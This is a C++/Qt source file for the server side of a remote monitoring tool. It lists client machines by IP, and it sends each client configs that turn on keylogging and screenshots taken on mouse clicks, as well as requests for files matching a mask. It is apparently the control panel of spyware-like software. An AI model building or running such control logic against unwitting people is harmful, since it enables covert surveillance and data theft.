#include "server.h"
#include "ui_server.h"

//https://www.iconfinder.com/icons/46254/active_approval_online_status_icon#size=16
//https://www.iconfinder.com/icons/46252/busy_offline_status_icon#size=16
//Yusuke Kamiyamane
//License: Creative Commons (Attribution 3.0 Unported)

Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
    QMainWindow(parent),
    path(defaultPath),
    ui(new Ui::Server)
{
    ui->setupUi(this);

    //Disable buttons
    ui->buttonFileDialog->setEnabled(false);
    ui->buttonSaveConfig->setEnabled(false);
    ui->buttonSendConfig->setEnabled(false);
    //Screenshot
    ui->spinSeconds->setEnabled(false);
    ui->checkLMB->setEnabled(false);
    ui->checkRMB->setEnabled(false);
    ui->checkMMB->setEnabled(false);
    ui->checkMWH->setEnabled(false);
    //Keylogger
    ui->checkOnOff->setEnabled(false);
    ui->spinSeconds2->setEnabled(false);

    loadUsers();

    //Setup model
    setupModels();
    ui->treeUsers->setModel(treeModel);

    //Setup mapper
    uiMapper = new QDataWidgetMapper(this);
    uiMapper->setModel(treeModel);
    uiMapper->addMapping(ui->spinSeconds, 2, "value");
    uiMapper->addMapping(ui->checkLMB, 3);
    uiMapper->addMapping(ui->checkRMB, 4);
    uiMapper->addMapping(ui->checkMMB, 5);
    uiMapper->addMapping(ui->checkMWH, 6);
    uiMapper->addMapping(ui->checkOnOff, 7);
    uiMapper->addMapping(ui->spinSeconds2, 8);

    //Hide model items in tree view
    for (int i=2; i<=8; ++i)
        ui->treeUsers->setColumnHidden(i, true);

    connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
            [this](const QModelIndex& current, const QModelIndex&  /* previous */ ) {
                uiMapper->setCurrentIndex(current.row());
                static bool first = true;
                if (first)
                {
                    ui->buttonFileDialog->setEnabled(true);
                    ui->buttonSaveConfig->setEnabled(true);
                    ui->buttonSendConfig->setEnabled(true);
                    ui->spinSeconds->setEnabled(true);
                    ui->checkLMB->setEnabled(true);
                    ui->checkRMB->setEnabled(true);
                    ui->checkMMB->setEnabled(true);
                    ui->checkMWH->setEnabled(true);
                    ui->checkOnOff->setEnabled(true);
                    ui->spinSeconds2->setEnabled(true);
                    first = false;
                }
    });

    //Start modules
    fileServer = new FileServer(this, _port, path + "/users");
    fileClient = new FileClient(this, "127.0.0.1", 1234);
    fileServer->start();

    QDir configDir;
    configDir.mkpath(path + "/configs");

    connect(fileServer, &FileServer::stringRecieved, [this](QString str, QString ip) { this->getString(str, ip); });

    //Connect buttons clicks
    connect(ui->buttonSendConfig, &QPushButton::clicked, this, &Server::configSendClicked);
    connect(ui->buttonSaveConfig, &QPushButton::clicked, this, &Server::configSaveClicked);
    connect(ui->buttonFileDialog, &QPushButton::clicked, this, &Server::fileDialogClicked);
}

Server::~Server()
{
    saveUsers();
    delete uiMapper;
    delete treeModel;
    delete fileServer;
    delete fileClient;
    delete ui;
}

void Server::setupModels()
{
    treeModel = new QStandardItemModel(this);
    treeModel->setColumnCount(9);

    //Set header names
    treeModel->setHeaderData(0, Qt::Horizontal, "username");
    treeModel->setHeaderData(1, Qt::Horizontal, "ip");
    treeModel->setHeaderData(2, Qt::Horizontal, "secondsScreen");
    treeModel->setHeaderData(3, Qt::Horizontal, "LMB");
    treeModel->setHeaderData(4, Qt::Horizontal, "RMB");
    treeModel->setHeaderData(5, Qt::Horizontal, "MMB");
    treeModel->setHeaderData(6, Qt::Horizontal, "MWH");
    treeModel->setHeaderData(7, Qt::Horizontal, "isLogWorking");
    treeModel->setHeaderData(8, Qt::Horizontal, "SecondLog");

    //Traverse existing users and add to model
    QList<QStandardItem*> items;
    QHash<QString, QString>::iterator iter = usernames.begin();
    Config* cfg;
    QString ip;
    QString username;
    while (iter != usernames.end())
    {
        ip = iter.key();
        username = iter.value();

        //load configs
        if (usersConfig.contains(ip))
            cfg = usersConfig.value(ip);
        else
        {
            cfg = new Config();
            usersConfig.insert(ip, cfg);
            if (!loadConfig(*cfg, path + "/configs/" + ip + ".cfg"))
                saveConfig(*cfg, path + "/configs/" + ip + ".cfg");
        }

        initTreeModel(items, ip, username, cfg, OFFLINE);
        ++iter;
    }
}

void Server::initTreeModel(QList<QStandardItem*> &items,
                           const QString &ip,
                           const QString &username,
                           const Config *cfg,
                           const state& st)
{
    //Create items and write to model
    QStandardItem* ipItem = new QStandardItem(ip);
    QStandardItem* nameItem = new QStandardItem(QIcon(st ? ":/icons/online.png" : ":/icons/offline.png"), username);
    //Set not editable item
    ipItem->setFlags(ipItem->flags() & ~Qt::ItemIsEditable);
    nameItem->setFlags(nameItem->flags() & ~Qt::ItemIsEditable);

    QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->secondsScreen));
    QStandardItem* LMB = new QStandardItem(QString::number((cfg->mouseButtons >> 3 & 0x1) ? 1 : 0));
    QStandardItem* RMB = new QStandardItem(QString::number((cfg->mouseButtons >> 2 & 0x1) ? 1 : 0));
    QStandardItem* MMB = new QStandardItem(QString::number((cfg->mouseButtons >> 1 & 0x1) ? 1 : 0));
    QStandardItem* MWH = new QStandardItem(QString::number((cfg->mouseButtons & 0x1) ? 1 : 0));
    QStandardItem* secondsLogItem = new QStandardItem(QString::number(cfg->secondsLog));
    QStandardItem* logRunItem = new QStandardItem(cfg->logRun ? "1" : "0");

    items << nameItem << ipItem << secondsItem << LMB << RMB << MMB << MWH << logRunItem << secondsLogItem;
    treeModel->appendRow(items);
    items.clear();
}

bool Server::saveUsers()
{
    QFile usersFile("list.usr");
    if ( !usersFile.open(QIODevice::WriteOnly) )
        return false;
    QDataStream users(&usersFile);
    users << usernames;
    usersFile.close();
    return true;
}

bool Server::loadUsers()
{
    QFile usersFile("list.usr");
    if ( usersFile.exists() )
    {
        if ( !usersFile.open(QIODevice::ReadOnly) )
            return false;
        QDataStream users(&usersFile);
        users >> usernames;
        usersFile.close();
        //Check all configs in folder by user's ip
        QDirIterator iter(path + "/configs", QStringList() << "*.cfg", QDir::Files);
        QString ip;
        while (iter.hasNext())
        {
            iter.next();
            ip = iter.fileName().section(".", 0, -2);
            //If user already exists => load config to memory
            if (usernames.contains(ip))
            {
                Config* config = new Config;
                loadConfig(*config, path + "/configs/" + ip + ".cfg");
                usersConfig.insert(ip, config);
            }
        }
        return true;
    }
    else
        return false;
}


void Server::getString(const QString str, const QString ip)
{
    //TODO: delete
    ui->plainTextEdit->appendPlainText(str);
    //Parse string
    QString command = str.section('|', 0, 0);
    //If user online
    if (command == "ONLINE")
    {
        QString username = str.section("|", -1, -1);
        //If QHash doesn't contain new user's ip
        if ( ! usernames.contains(ip))
        {
            QString cfgPath = path + "/configs/" + ip + ".cfg";
            Config* config = new Config;
            //If config doesn't exist
            if( ! loadConfig(*config, cfgPath) )
            {
                qDebug() << "Config not found. Creating new.";
                saveConfig(*config, cfgPath);
            }
            usernames.insert(ip, username);
            usersConfig.insert(ip, config);

            //Add new user to tree model
            QList<QStandardItem*> items;
            initTreeModel(items, ip, username, config, ONLINE);
        }
        else
        {
            QList<QStandardItem*> items;
            items = treeModel->findItems(username, Qt::MatchFixedString, 0);
            if (items.size() == 1)
                items.at(0)->setIcon(QIcon(":/icons/online.png"));
            else
                qDebug() << "Error. Users have the same ip";
        }
    }
    else if (command == "OFFLINE")
    {
        QString username = str.section("|", -1, -1);
        QList<QStandardItem*> items;
        items = treeModel->findItems(username, Qt::MatchFixedString, 0);
        if (items.size() == 1)
            items.at(0)->setIcon(QIcon(":/icons/offline.png"));
        else
            qDebug() << "Error. Users have the same ip";
    }
}

void Server::setConfig(Config &cfg)
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        int currentRow = ui->treeUsers->currentIndex().row();
        //TODO bindEnter
        cfg.bindEnter = false;
        // 0xLMB_RMB_MMB_MWH
        int lmb = treeModel->index(currentRow, 3).data().toBool() ? 8 : 0;
        int rmb = treeModel->index(currentRow, 4).data().toBool() ? 4 : 0;
        int mmb = treeModel->index(currentRow, 5).data().toBool() ? 2 : 0;
        int mwh = treeModel->index(currentRow, 6).data().toBool() ? 1 : 0;
        //Screenshot
        cfg.mouseButtons = lmb + rmb + mmb + mwh;
        cfg.secondsScreen = treeModel->index(currentRow, 2).data().toInt();
        //Keylogger
        cfg.logRun = treeModel->index(currentRow, 7).data().toBool();
        cfg.secondsLog = treeModel->index(currentRow, 8).data().toInt();
    }
}

void Server::configSendClicked()
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QString ip = ipIndex.data().toString();
        quint16 port = 1234;
        //QString cfgPath = path + "/configs/" + ip + ".cfg";
        QString tempCfgPath = path + "/configs/" + ip + "_temp.cfg";
        //QFile oldCfgFile(cfgPath);
        //QFile tempCfgFile(tempCfgPath);
        Config* cfg = usersConfig.value(ip);

        setConfig(*cfg);
        fileClient->changePeer(ip, port);

        //Save temp config
        saveConfig(*cfg, tempCfgPath);

        //Send config
        connect(fileClient, &FileClient::transmitted, [this] ()
        {
            QString cfg = path + "/configs/" + fileClient->getIp();
            QFile oldCfgFile(cfg + ".cfg");
            //Remove old config
            if (oldCfgFile.exists())
                oldCfgFile.remove();
            //Rename new config to ".cfg"
            QFile tempCfgFile(cfg + "_temp.cfg");
            tempCfgFile.rename(cfg + ".cfg");
            //disconnect after file transfer
            disconnect(fileClient, &FileClient::transmitted, 0, 0);
        });

        connect(fileClient, &FileClient::error, [this] (QAbstractSocket::SocketError socketError)
        {
            qDebug() << "Config not sent" << socketError;
            QString cfg = path + "/configs/" + fileClient->getIp();
            QFile tempCfgFile(cfg + "_temp.cfg");
            tempCfgFile.remove();
            disconnect(fileClient, &FileClient::error, 0, 0);
        });

        //Send config
        fileClient->enqueueData(_FILE, tempCfgPath);
        fileClient->connect();
    }
}

void Server::configSaveClicked()
{
    //If selected nothing
    if (ui->treeUsers->currentIndex() == QModelIndex())
        return;
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QString ip = ipIndex.data().toString();

        QString cfgPath = path + "/configs/" + ip + ".cfg";
        Config* cfg = usersConfig.value(ip);

        setConfig(*cfg);
        saveConfig(*cfg, cfgPath);
    }
}

void Server::fileDialogClicked()
{
    fileDialog = new FileDialog(this);
    //filesDialog->setAttribute(Qt::WA_DeleteOnClose, true);
    fileDialog->show();

    //Connect "accepted" and "rejected"
    connect(fileDialog, &FileDialog::accepted, this, &Server::fileDialogAccepted);
    connect(fileDialog, &FileDialog::rejected, fileDialog, &FileDialog::deleteLater);
}

void Server::fileDialogAccepted()
{
    QString mask = QString::number(fileDialog->getFileMask());
    QString string = fileDialog->getFileString();

    //If no parameters set or user isn't selected
    if ( (mask == "0" && string.isEmpty()) || ui->treeUsers->currentIndex() == QModelIndex())
    {

    }
    else
    {
        QModelIndex ipIndex = treeModel->index(ui->treeUsers->currentIndex().row(), 1);
        QString ip = ipIndex.data().toString();
        quint16 port = 1234;
        fileClient->changePeer(ip, port);

        //Send string
        fileClient->enqueueData(_STRING, "FILES|" + mask + '|' + string);
        fileClient->connect();
    }
    delete fileDialog;
}
